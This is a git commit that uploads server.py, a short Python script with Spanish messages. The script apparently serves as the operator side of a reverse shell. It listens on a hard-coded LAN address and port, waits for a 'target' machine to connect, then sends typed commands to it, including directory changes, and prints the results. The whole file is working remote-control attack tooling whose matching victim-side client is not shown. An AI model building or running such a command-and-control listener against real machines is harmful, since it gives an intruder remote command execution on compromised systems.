5b654b07e7fc7653c5a5cbf11fec7b454b44ca1d
MartinCC140 <chacakidskids@gmail.com>
2026-01-09 10:31:00 -0300

    Add files via upload

---
+++ server.py
@@ -0,0 +1,56 @@
+import socket
+import os
+import subprocess
+
+
+
+def shell():
+    current_dir = target.recv(3000)
+
+    while True:
+        command = input(f"(current_dir)-#: ").encode('utf-8')
+        if command.decode('utf-8') == "exit":
+            break
+        elif command.decode('utf-8').find("cd") == 0:
+            target.send(command)
+            res = target.recv(3000)
+            current_dir = res
+            
+        else:
+            try:
+                target.send(command)
+                res = target.recv(3000)
+                if res == "1":
+                    continue
+                elif command.decode('utf-8') == "":
+                    pass
+                else:
+                    print(res.decode('utf-8'))
+            except:    
+                print("Ocurrio un error con el comando insertado")
+                pass
+def config():
+    global server
+    global target
+    global ip
+    global port
+    
+    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ip = "192.168.18.21"
+    port = 1324
+    
+    server.bind((ip, port))
+    server.listen(5)
+    print("Corriendo servidor, esperando conexiones...")
+    
+    while True:
+        target, addr = server.accept()
+        print("Conexion establecida", addr)
+        break
+    
+    
+    
+config()
+shell()
+target.close()
